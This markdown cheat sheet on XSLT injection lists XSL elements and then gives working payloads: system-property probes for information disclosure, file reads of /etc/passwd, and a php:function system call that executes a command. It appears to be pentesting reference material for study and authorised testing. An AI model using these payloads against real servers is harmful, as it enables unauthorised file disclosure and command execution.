# Server-Side Attacks (Quick Reference)

> For detailed cheatsheets, see [SSRF](ssrf.md), [SSTI](ssti.md), and [SSI](ssi.md).

## XSLT Injection

### Elements

| `<xsl:template>` | This element indicates an XSL template. It can contain a `match` attribute that contains a path in the XML-document that the template applies to                |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `<xsl:value-of>` | This element extracts the value of the XML node specified in the `select` attribute                                                                             |
| `<xsl:for-each>` | This elements enables looping over all XML nodes specified in the `select` attribute                                                                            |
| `<xsl:sort>`     | This element specifies the node to sort elements in a for loop by in the `select` argument. Additionally, a sort order may be specified in the `order` argument |
| `<xsl:if>`       | This element can be used to test for conditions on a node. The condition is specified in the `test` argument                                                    |

### Injection Payloads

| **Information Disclosure** |                                                                             |
| -------------------------- | --------------------------------------------------------------------------- |
|                            | `<xsl:value-of select="system-property('xsl:version')" />`                  |
|                            | `<xsl:value-of select="system-property('xsl:vendor')" />`                   |
|                            | `<xsl:value-of select="system-property('xsl:vendor-url')" />`               |
|                            | `<xsl:value-of select="system-property('xsl:product-name')" />`             |
|                            | `<xsl:value-of select="system-property('xsl:product-version')" />`          |
| **LFI**                    |                                                                             |
|                            | `<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />`           |
|                            | `<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />` |
| **RCE**                    |                                                                             |
|                            | `<xsl:value-of select="php:function('system','id')" />`                     |

---

## References

- [PayloadsAllTheThings - XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
- [HackTricks - XSLT Injection](https://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html)
